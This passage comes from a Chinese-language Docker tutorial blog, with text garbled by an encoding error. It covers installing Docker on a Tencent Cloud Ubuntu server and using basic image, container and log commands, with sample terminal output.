<p>é•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ç±»å’Œå®ä¾‹ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚</p>
<blockquote>
<p>é€šä¿—æ¥è®²ï¼Œé•œåƒç›¸å½“äºç±»ï¼Œå®¹å™¨ç›¸å½“äºå¯¹è±¡</p>
</blockquote>
</li>
<li><p><strong>ä»“åº“ï¼ˆrepositoryï¼‰</strong></p>
<p>ä»“åº“å¯çœ‹æˆä¸€ä¸ªä»£ç æ§åˆ¶ä¸­å¿ƒï¼Œç”¨æ¥ä¿å­˜é•œåƒã€‚</p>
<p>ä»“åº“åˆ†ä¸ºå…¬æœ‰ä»“åº“å’Œç§æœ‰ä»“åº“ã€‚(å¾ˆç±»ä¼¼git)</p>
<p>Docker Hubæ˜¯å›½å¤–çš„ã€‚</p>
<p>é˜¿é‡Œäº‘â€¦éƒ½æœ‰å®¹å™¨æœåŠ¡å™¨(é…ç½®é•œåƒåŠ é€Ÿ!)</p>
</li>
</ul>
<h2 id="2ã€å®‰è£…docker"><a href="#2ã€å®‰è£…docker" class="headerlink" title="2ã€å®‰è£…docker"></a>2ã€å®‰è£…docker</h2><ul>
<li>ä½¿ç”¨äº‘æœåŠ¡å™¨çš„ï¼Œå¯ä»¥ç›´æ¥å»å¯¹åº”çš„å®˜ç½‘å¯»æ‰¾å¯¹åº”çš„å®‰è£…é…ç½®æ–¹æ¡ˆ</li>
<li>æ¯”å¦‚æˆ‘è¿™é‡Œä½¿ç”¨çš„å°±æ˜¯è…¾è®¯äº‘çš„Ubuntuç³»ç»Ÿ</li>
</ul>
<ol>
<li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ·»åŠ  Docker è½¯ä»¶æºã€‚</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ca-certificates curl</span><br><span class="line">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="line">sudo curl -fsSL https://mirrors.cloud.tencent.com/docker-ce/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc</span><br><span class="line">sudo <span class="built_in">chmod</span> a+r /etc/apt/keyrings/docker.asc</span><br><span class="line"><span class="built_in">echo</span>   <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.asc] https://mirrors.cloud.tencent.com/docker-ce/linux/ubuntu/ \</span></span><br><span class="line"><span class="string">  <span class="subst">$(. /etc/os-release &amp;&amp; echo <span class="string">&quot;<span class="variable">$VERSION_CODENAME</span>&quot;</span>)</span> stable&quot;</span> |   sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå®‰è£… Dockerã€‚</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¿è¡Œ Dockerã€‚</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œæ£€æŸ¥å®‰è£…ç»“æœã€‚</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure>

<p>è¿”å›å¦‚ä¸‹ä¿¡æ¯ï¼Œå³è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/28470f218824e23ec82ce28a7b50fbba--134f--image-20240922094005847.png" alt="image-20240922094005847"></p>
<ul>
<li>é…ç½®å¯¹åº”çš„åŠ é€Ÿæº</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<ul>
<li>ç„¶åæ·»åŠ ä»¥ä¸‹å†…å®¹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">   <span class="string">&quot;https://mirror.ccs.tencentyun.com&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œé‡å¯ Docker å³å¯ã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æµ‹è¯•ä½¿ç”¨</p>
</blockquote>
<p>è¿è¡Œhello-world</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/5bf1cdf230c3155be2fdda1beabb1ff3--764e--image-20240922095218341.png" alt="image-20240922095218341"></p>
<blockquote>
<p>æŸ¥çœ‹é•œåƒ</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">hello-world   latest    d2c94e258dcb   16 months ago   13.3kB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æŸ¥çœ‹å®¹å™¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED              STATUS                          PORTS     NAMES</span><br><span class="line">03e09e9f8b65   hello-world   <span class="string">&quot;/hello&quot;</span>   About a minute ago   Exited (0) About a minute ago          compassionate_gates</span><br><span class="line"><span class="comment"># åŠ -aè¡¨ç¤ºæ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œçš„ï¼Œä¸åŠ -aè¡¨ç¤ºæ­£åœ¨è¿è¡Œçš„å®¹å™¨</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç§»é™¤å®¹å™¨é•œåƒ        </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f d2c94e258dcb  ç§»é™¤é•œåƒ</span></span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:91fb4b041da273d5a3273b6d587d62d518300a6ad268b28628f74997b93171b2</span><br><span class="line">Deleted: sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rm 03e09e9f8b65  ç§»é™¤å®¹å™¨</span></span><br><span class="line">03e09e9f8b65</span><br></pre></td></tr></table></figure>

<h2 id="3ã€å›æ»šhello-worldæµç¨‹"><a href="#3ã€å›æ»šhello-worldæµç¨‹" class="headerlink" title="3ã€å›æ»šhello-worldæµç¨‹"></a>3ã€å›æ»šhello-worldæµç¨‹</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/5f27548b9d8f1e9607ec770f8163467d--85fa--image-20240922100450374.png" alt="image-20240922100450374"></p>
<p><strong>åº•å±‚åŸç†</strong></p>
<blockquote>
<p>dockeræ˜¯æ€ä¹ˆå·¥ä½œçš„</p>
</blockquote>
<p>dockeræ˜¯ä¸€ä¸ªclient-serverç»“æ„çš„ç³»ç»Ÿï¼Œdockerå®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨ä¸»æœºä¸Šï¼Œç„¶åé€šè¿‡socketè¿æ¥ä»å®¢æˆ·ç«¯è®¿é—®dockerå®ˆæŠ¤è¿›ç¨‹ã€‚</p>
<p>dockerå®ˆæŠ¤è¿›ç¨‹ä»å®¢æˆ·ç«¯æ¥æ”¶å‘½ä»¤ï¼Œå¹¶æŒ‰ç…§å‘½ä»¤ï¼Œç®¡ç†è¿è¡Œåœ¨ä¸»æœºä¸Šçš„å®¹å™¨ã€‚</p>
<p>ä¸€ä¸ªdockerå®¹å™¨ï¼Œæ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºè¿›ç¨‹è¿è¡Œçš„é›†è£…ç®±ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/d9a59b17ba24e343869da74322314fe6--cc31--image-20240922100554772.png" alt="image-20240922100554772"></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆdockeræ¯”vmå¿«</p>
</blockquote>
<ol>
<li>Dockeræœ‰è¿™æ¯”è™šæ‹Ÿæœºæ›´å°‘çš„æŠ½è±¡å±‚ï¼Œ<strong>ç”±äºDockerä¸éœ€è¦Hypervisorå®ç°ç¡¬ä»¶èµ„æºè™šæ‹ŸåŒ–</strong>ï¼Œè¿è¡Œåœ¨Dockerä¸Šçš„ç¨‹åºç›´æ¥ä½¿ç”¨çš„éƒ½æ˜¯å®é™…ç‰©ç†æœºä¸Šçš„ç¡¬ä»¶èµ„æºï¼Œå› æ­¤åœ¨CPUã€å†…å­˜åˆ©ç”¨ç‡ä¸Šæœ‰æ˜æ˜¾çš„ä¼˜åŠ¿ã€‚</li>
<li>**Dockeråˆ©ç”¨çš„æ˜¯å®¿ä¸»æœºçš„å†…æ ¸ï¼Œè€Œä¸éœ€è¦ä½¿ç”¨Guest OS ** ï¼Œå› æ­¤å½“æ–°å»ºä¸€ä¸ªå®¹å™¨æ—¶ï¼Œdockerä¸éœ€è¦å’Œè™šæ‹Ÿæœºä¸€æ ·é‡æ–°åŠ è½½ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œè€Œé¿å…å¼•å¯» ï¼ŒåŠ è½½æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯ä¸ªæ¯”è¾ƒè´¹äº‹è´¹èµ„æºçš„è¿‡ç¨‹ï¼Œå½“æ–°å»ºä¸€ä¸ªè™šæ‹Ÿæœºæ—¶ï¼Œè™šæ‹Ÿæœºè½¯ä»¶éœ€è¦åŠ è½½Guest OSï¼Œè¿”å›çš„æ–°å»ºçš„è¿‡ç¨‹æ˜¯åˆ†é’Ÿçº§åˆ«ï¼Œè€Œdockerç›´æ¥ä½¿ç”¨çš„æ˜¯å®¿ä¸»æœºä¸Šçš„æ“ä½œç³»ç»Ÿï¼Œåˆ™çœç•¥äº†è¿”å›è¿™ä¸ªçš„è¿‡ç¨‹ï¼Œå› æ­¤æ–°å»ºä¸€ä¸ªdockerå®¹å™¨åªéœ€è¦å‡ ç§’é’Ÿã€‚</li>
</ol>
<p>è™šæ‹Ÿæœºä¸Dockeræ¶æ„å¯¹æ¯”å›¾ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/18b3c4595e4fcb446eec5aa6f07eb057--d721--image-20240922100609249.png" alt="image-20240922100609249"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/bd0035ab49544d13114ef688ea55e553--3f26--image-20240922100613510.png" alt="image-20240922100613510"></p>
<h1 id="ä¸‰ã€Dockerå¸¸è§å‘½ä»¤"><a href="#ä¸‰ã€Dockerå¸¸è§å‘½ä»¤" class="headerlink" title="ä¸‰ã€Dockerå¸¸è§å‘½ä»¤"></a>ä¸‰ã€Dockerå¸¸è§å‘½ä»¤</h1><p>å®˜æ–¹æ–‡æ¡£å¸¸ç”¨å‘½ä»¤åœ°å€:<a href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/da3aea870e0b1d7fbb60aa86470e7314--c384--image-20240922101137679.png" alt="image-20240922101137679"></p>
<h2 id="1ã€å¸®åŠ©å‘½ä»¤"><a href="#1ã€å¸®åŠ©å‘½ä»¤" class="headerlink" title="1ã€å¸®åŠ©å‘½ä»¤"></a>1ã€å¸®åŠ©å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ˜¾ç¤ºdockerçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</span></span><br><span class="line">docker version    </span><br><span class="line"><span class="comment">#æ˜¾ç¤ºdockerçš„ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨çš„æ•°é‡</span></span><br><span class="line">docker info   </span><br><span class="line"><span class="comment">#å¸®åŠ©å‘½ä»¤</span></span><br><span class="line">docker --<span class="built_in">help</span></span><br><span class="line">docker å‘½ä»¤ --<span class="built_in">help</span> </span><br></pre></td></tr></table></figure>

<h2 id="2ã€é•œåƒå‘½ä»¤"><a href="#2ã€é•œåƒå‘½ä»¤" class="headerlink" title="2ã€é•œåƒå‘½ä»¤"></a>2ã€é•œåƒå‘½ä»¤</h2><blockquote>
<p>docker image  æŸ¥çœ‹æ‰€æœ‰æœ¬åœ°ä¸»æœºä¸Šçš„é•œåƒ</p>
</blockquote>
<p>å‚æ•°å’Œé€‰é¡¹</p>
<ul>
<li><code>-a</code>, â€“all             åˆ—å‡ºæ‰€æœ‰é•œåƒ</li>
<li><code>-q</code>, â€“quiet           åªæ˜¾ç¤ºé•œåƒid</li>
</ul>
<p>æµ‹è¯•</p>
<p>1ã€æŸ¥çœ‹æœ¬åœ°ä¸»æœºä¸Šçš„é•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">hello-world   latest    d2c94e258dcb   16 months ago   13.3kB</span><br></pre></td></tr></table></figure>

<p>è§£é‡Šï¼š</p>
<ul>
<li>REPOSITORY é•œåƒçš„ä»“åº“æº</li>
<li>TAG é•œåƒçš„æ ‡ç­¾ï¼ˆç‰ˆæœ¬ï¼‰ latestè¡¨ç¤ºæœ€æ–°çš„ç‰ˆæœ¬</li>
<li>IMAGE ID é•œåƒid</li>
<li>CREATED é•œåƒçš„åˆ›å»ºæ—¶é—´</li>
<li>SIZE é•œåƒçš„å¤§å°</li>
</ul>
<p>2ã€åˆ—å‡ºæ‰€æœ‰é•œåƒçš„id</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images -aq</span></span><br><span class="line">d2c94e258dcb</span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker search æœç´¢é•œåƒ</p>
</blockquote>
<p>é•œåƒä»“åº“åœ°å€ï¼š<a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<p>å‚æ•°å’Œé€‰é¡¹</p>
<ul>
<li><code>-f</code>, â€“filter filter   åŸºäºæ¡ä»¶è¿‡æ»¤</li>
</ul>
<p>æµ‹è¯•</p>
<p>1ã€æœç´¢mysqlé•œåƒ</p>
<p>åœ¨dockerä»“åº“ä¸Šæœ  <a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨å‘½ä»¤å»æœ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ****</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡æœåŠ¡å™¨è¦æ˜¯ä¸å¤ªè¡Œï¼Œä¸€èˆ¬ä¼šç›´æ¥è¶…æ—¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker search mysql</span></span><br><span class="line">Error response from daemon: Get <span class="string">&quot;https://index.docker.io/v1/search?q=mysql&amp;n=25&quot;</span>: dial tcp 199.59.150.39:443: i/o <span class="built_in">timeout</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker rmiåˆ é™¤é•œåƒ</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f é•œåƒid                    #åˆ é™¤æŒ‡å®šé•œåƒ</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f é•œåƒid1 é•œåƒid2 é•œåƒid3     #åˆ é™¤å¤šä¸ªé•œåƒ</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f $(docker images -aq)      #åˆ é™¤æ‰€æœ‰é•œåƒ </span></span><br></pre></td></tr></table></figure>

<h2 id="3ã€å®¹å™¨å‘½ä»¤"><a href="#3ã€å®¹å™¨å‘½ä»¤" class="headerlink" title="3ã€å®¹å™¨å‘½ä»¤"></a>3ã€å®¹å™¨å‘½ä»¤</h2><p>æˆ‘ä»¬æœ‰äº†é•œåƒï¼Œæ‰èƒ½åˆ›å»ºå®¹å™¨ï¼Œæ‰€ä»¥å…ˆä¸‹è½½ä¸€ä¸ªcentosé•œåƒæ¥å­¦ä¹ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull centos</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">a1d0c7532777: Pull complete </span><br><span class="line">Digest: sha256:a27fd8080b517143cbbbab9dfb7c8571c40d67d534bbdee55bd6c473f432b177</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:latest</span><br><span class="line">docker.io/library/centos:latest</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¯åŠ¨å®¹å™¨</p>
</blockquote>
<p>docker run [å¯é€‰å‚æ•°] å®¹å™¨åæˆ–è€…å®¹å™¨id</p>
<p>åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤</p>
<p>å¯é€‰å‚æ•°</p>
<ul>
<li><strong>-i:</strong> ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨</li>
<li><strong>-t:</strong> ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨</li>
<li><strong>-P:</strong> éšæœºç«¯å£æ˜ å°„ï¼Œå®¹å™¨å†…éƒ¨ç«¯å£<strong>éšæœº</strong>æ˜ å°„åˆ°ä¸»æœºçš„ç«¯å£</li>
<li><strong>-p:</strong> æŒ‡å®šç«¯å£æ˜ å°„ï¼Œæ ¼å¼ä¸ºï¼š<strong>ä¸»æœº(å®¿ä¸»)ç«¯å£:å®¹å™¨ç«¯å£</strong></li>
<li><strong>-d:</strong> åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDï¼›</li>
<li><strong>â€“name&#x3D;â€nginx-lbâ€:</strong> ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°</li>
<li><strong>-e username&#x3D;â€ritchieâ€:</strong> è®¾ç½®ç¯å¢ƒå˜é‡</li>
</ul>
<p>æµ‹è¯•ï¼š</p>
<p>1ã€ä½¿ç”¨é•œåƒcentosä»¥äº¤äº’æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨,åœ¨å®¹å™¨å†…æ‰§è¡Œ&#x2F;bin&#x2F;bashå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it centos /bin/bash</span></span><br><span class="line">[root@5bfd7775d62f /]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES</span><br><span class="line">5bfd7775d62f   centos    <span class="string">&quot;/bin/bash&quot;</span>   55 seconds ago   Up 54 seconds             goofy_ellis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>é€€å‡ºå®¹å™¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span>       <span class="comment">#ç›´æ¥é€€å‡ºå®¹å™¨å¹¶å…³é—­</span></span><br><span class="line">å¿«æ·é”®ï¼šctrl+p+q   <span class="comment">#å®¹å™¨ä¸å…³é—­é€€å‡º æ³¨æ„på’Œqçš„é¡ºåºï¼</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>åˆ—å‡ºæ‰€æœ‰çš„å®¹å™¨</p>
</blockquote>
<p>docker ps</p>
<p>å¯é€‰å‚æ•°</p>
<ul>
<li>**-a :**æ˜¾ç¤ºæ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œçš„ã€‚</li>
<li>**-n :**åˆ—å‡ºæœ€è¿‘åˆ›å»ºçš„nä¸ªå®¹å™¨ã€‚</li>
<li>**-q :**é™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºå®¹å™¨ç¼–å·ã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED              STATUS              PORTS     NAMES</span><br><span class="line">5bfd7775d62f   centos    <span class="string">&quot;/bin/bash&quot;</span>   About a minute ago   Up About a minute             goofy_ellis</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE         COMMAND       CREATED              STATUS                      PORTS     NAMES</span><br><span class="line">5bfd7775d62f   centos        <span class="string">&quot;/bin/bash&quot;</span>   About a minute ago   Up About a minute                     goofy_ellis</span><br><span class="line">8d2482707137   hello-world   <span class="string">&quot;/hello&quot;</span>      12 minutes ago       Exited (0) 12 minutes ago             clever_mccarthy</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>åˆ é™¤å®¹å™¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f å®¹å™¨<span class="built_in">id</span>                       <span class="comment"># åˆ é™¤æŒ‡å®šå®¹å™¨</span></span><br><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -aq)       <span class="comment"># åˆ é™¤æ‰€æœ‰å®¹å™¨</span></span><br><span class="line">docker ps -a -q|xargs docker <span class="built_in">rm</span> -f  <span class="comment"># åˆ é™¤æ‰€æœ‰çš„å®¹å™¨</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¯åŠ¨å’Œåœæ­¢å®¹å™¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start å®¹å™¨<span class="built_in">id</span>           <span class="comment"># å¯åŠ¨å®¹å™¨</span></span><br><span class="line">docker restart å®¹å™¨<span class="built_in">id</span>         <span class="comment"># é‡å¯å®¹å™¨</span></span><br><span class="line">docker stop å®¹å™¨<span class="built_in">id</span>            <span class="comment"># åœæ­¢å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">kill</span> å®¹å™¨<span class="built_in">id</span>            <span class="comment"># å¼ºåˆ¶åœæ­¢å½“å‰çš„å®¹å™¨</span></span><br></pre></td></tr></table></figure>

<h2 id="4ã€å¸¸ç”¨å…¶ä»–å‘½ä»¤"><a href="#4ã€å¸¸ç”¨å…¶ä»–å‘½ä»¤" class="headerlink" title="4ã€å¸¸ç”¨å…¶ä»–å‘½ä»¤"></a>4ã€å¸¸ç”¨å…¶ä»–å‘½ä»¤</h2><blockquote>
<p>åå°å¯åŠ¨å‘½ä»¤</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d centos</span></span><br><span class="line">3c59ba355924fa7659dea00b40ee81e0b156ea8173cc3ed55d10abdda9b71346</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line"></span><br><span class="line"><span class="comment"># é—®é¢˜ï¼Œåç«¯å¯åŠ¨å®¹å™¨åï¼Œdocker psï¼Œå‘ç°centosåœæ­¢äº†</span></span><br><span class="line"><span class="comment"># å¸¸è§çš„å‘ï¼Œ docker å®¹å™¨ä½¿ç”¨åå°è¿è¡Œï¼Œ å°±å¿…é¡»è¦æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ï¼Œdockerå‘ç°æ²¡æœ‰åº”ç”¨ï¼Œå°±ä¼šè‡ªåŠ¨åœæ­¢</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -it centos  #è¿™ç§å¯åŠ¨å®¹å™¨åå°±ä¸ä¼šå…³é—­äº†</span></span><br><span class="line">427021a3fe1bed3ce5a2950d50204b0b5c7ba6124e436132cb810791e04d7c9d</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">427021a3fe1b   centos    <span class="string">&quot;/bin/bash&quot;</span>   3 seconds ago   Up 3 seconds             brave_moore</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æŸ¥çœ‹æ—¥å¿—</p>
</blockquote>
<p>docker logs [å‚æ•°ä¸å‚é€‰] å®¹å™¨id</p>
<p>å‚æ•°ä¸é€‰é¡¹</p>
<ul>
<li><strong>-f :</strong> è·Ÿè¸ªæ—¥å¿—è¾“å‡º</li>
<li><strong>-t :</strong> æ˜¾ç¤ºæ—¶é—´æˆ³</li>
<li>**â€“since :**æ˜¾ç¤ºæŸä¸ªå¼€å§‹æ—¶é—´çš„æ‰€æœ‰æ—¥å¿—</li>
<li><strong>-n</strong>æˆ–è€…**â€“tail :**ä»…åˆ—å‡ºæœ€æ–°Næ¡å®¹å™¨æ—¥å¿—</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker logs -tf -n=10 å®¹å™¨id</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker logs -tf -n=10 427021a3fe1b</span></span><br><span class="line"><span class="comment"># è¿™é‡Œæ²¡æœ‰æ—¥å¿—ï¼Œæˆ‘ä»¬è‡ªå·±ç¼–å†™ä¸€æ®µshellè„šæœ¬</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -it centos /bin/bash -c &quot;while true;do echo zyy hello;sleep 10;done&quot;</span></span><br><span class="line">26805bf07f643d921b05be3a9c3f9eff41481bc302406c8c64b8ffbfc72b52ee</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker logs -tf -n=10 26805bf07f6</span></span><br><span class="line">2024-09-22T02:29:02.878255691Z zyy hello</span><br><span class="line">2024-09-22T02:29:12.896589927Z zyy hello</span><br></pre></td></tr></table></figure>

<p><strong>å‘½ä»¤<code>docker run -d -it centos /bin/bash -c &quot;while true;do echo zyy hello;sleep 1;done&quot;</code>è§£é‡Šï¼š</strong></p>
<p>è¯¥å‘½ä»¤ä¼šä¸åœåœ°è¾“å‡ºå­—ç¬¦ä¸² â€œzyy helloâ€ï¼Œæ¯éš” 1 ç§’é’Ÿè¾“å‡ºä¸€æ¬¡ï¼Œç›´åˆ°å®¹å™¨è¢«åœæ­¢ã€‚</p>
<p>å…¶ä¸­ï¼Œå„ä¸ªå‚æ•°çš„å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>docker run</code> æ˜¯ Docker å‘½ä»¤çš„åŸºæœ¬è¯­æ³•ï¼Œç”¨äºå¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨ã€‚</li>
<li><code>-d</code> å‚æ•°è¡¨ç¤ºåœ¨åå°è¿è¡Œå®¹å™¨ã€‚</li>
<li><code>centos</code> å‚æ•°è¡¨ç¤ºä½¿ç”¨çš„é•œåƒåç§°ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ CentOS é•œåƒã€‚</li>
